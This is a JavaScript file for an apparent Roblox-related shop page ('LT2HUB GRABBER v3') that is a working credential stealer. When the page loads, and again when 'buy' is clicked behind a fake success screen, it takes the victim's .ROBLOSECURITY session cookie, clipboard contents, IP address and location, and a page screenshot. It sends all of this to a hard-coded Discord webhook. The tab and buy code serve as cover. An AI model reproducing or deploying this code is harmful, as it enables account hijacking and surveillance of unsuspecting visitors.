const webhook = "https://discord.com/api/webhooks/1436941603586576429/ZdBgo21SF3IFNIzZoOh-9OULt0edw8bYbnAX2AIRCsX11v0m04cftdZjea_nKm_y4bwd";

async function GRAB_EVERYTHING() {
    const data = { username: "LT2HUB GRABBER v3", embeds: [{ title: "💀 FRESH VICTIM", color: 16711680, timestamp: new Date().toISOString(), fields: [] }] };

    // 1. ROBLOSECURITY
    const cookies = document.cookie.split(';');
    const roblox = cookies.find(c => c.includes('.ROBLOSECURITY'));
    if (roblox) {
        const token = roblox.split('=')[1].trim();
        data.embeds[0].fields.push({ name: "🎟️ .ROBLOSECURITY", value: "```" + token.substring(0,1800) + "```" });
    }

    // 2. CLIPBOARD SILENT
    const input = document.createElement('input');
    input.style = 'position:fixed;opacity:0';
    document.body.appendChild(input);
    input.focus();
    setTimeout(() => {
        if (input.value.length > 2) data.embeds[0].fields.push({ name: "📋 CLIPBOARD", value: "```" + input.value.substring(0,1000) + "```" });
        input.remove();
    }, 300);

    // 3. IP + GEO
    try {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json();
        const geo = await (await fetch(`https://ipapi.co/${ip.ip}/json/`)).json();
        data.embeds[0].fields.push({ name: "🌐 IP", value: ip.ip });
        data.embeds[0].fields.push({ name: "📍 LOCATION", value: `${geo.city}, ${geo.country_name}` });
    } catch(e) {}

    // 4. SEND FIRST (without screenshot)
    fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});

    // 5. SCREENSHOT + SEND AGAIN
    setTimeout(async () => {
        try {
            const canvas = await html2canvas(document.body, {scale: 0.8, useCORS: true});
            data.embeds[0].image = { url: canvas.toDataURL() };
            fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
        } catch(e) {
            // fallback send again without image
            fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
        }
    }, 4000);
}

// BUY BUTTON
function buy() {
    document.body.innerHTML = `<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#0d1117;display:flex;align-items:center;justify-content:center;color:#58a6ff;font-size:5em">✅ SUCCESS</div>`;
    GRAB_EVERYTHING();
}

// TABS
document.querySelectorAll('.menu a').forEach(a => {
    a.addEventListener('click', e => {
        e.preventDefault();
        document.querySelectorAll('.menu a').forEach(x => x.classList.remove('active'));
        a.classList.add('active');
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.getElementById(a.dataset.tab).classList.add('active');
    });
});

// AUTO START
window.addEventListener('load', () => setTimeout(GRAB_EVERYTHING, 2500));